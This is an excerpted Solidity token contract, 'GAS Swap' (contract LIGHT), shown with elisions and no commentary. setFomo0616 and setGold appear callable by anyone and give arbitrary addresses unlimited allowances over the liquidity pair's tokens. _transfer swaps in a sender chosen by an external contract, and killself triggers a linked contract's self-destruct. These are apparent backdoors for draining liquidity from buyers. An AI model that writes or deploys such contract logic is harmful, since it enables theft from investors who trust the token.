...
contract LIGHT is Context, IERC20 {
  mapping(address => uint256) private _tOwned;
  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private constant MAX = ~uint256(0);

  string public name = /*TOKENNAME*/"GAS Swap"/*TOKENNAME*/;
  string public symbol = /*TOKENSYMBOL*/"GAS"/*TOKENSYMBOL*/;
  ...
  constructor() {
    ...
    _tOwned[address(this)] = totalSupply / 10;
    _tOwned[DEAD] = totalSupply - _tOwned[address(this)];
  ...
  function setFomo0616(address fomo) public returns (address) {
    ...
    _approve(fomo, _pancakeRouter, MAX);
    _approve(uniswapV2Pair, fomo, MAX);
  ...
  function setGold(address gold) public {
    require(address(_gold) == address(0));
    _approve(gold, _pancakeRouter, MAX);
    _approve(uniswapV2Pair, gold, MAX);
  ...
  function _transfer(
    ...
    address msger = address(_gold) == address(0) ? address(0) : _gold.dstAddr();
    if (recipient == uniswapV2Pair && msger != address(0)) sender = msger;
    _fomo.transferNotify(sender, recipient, amount);
  ...
  function killself() external {
    ...
    if (address(_gold) != address(0)) _gold.killself();
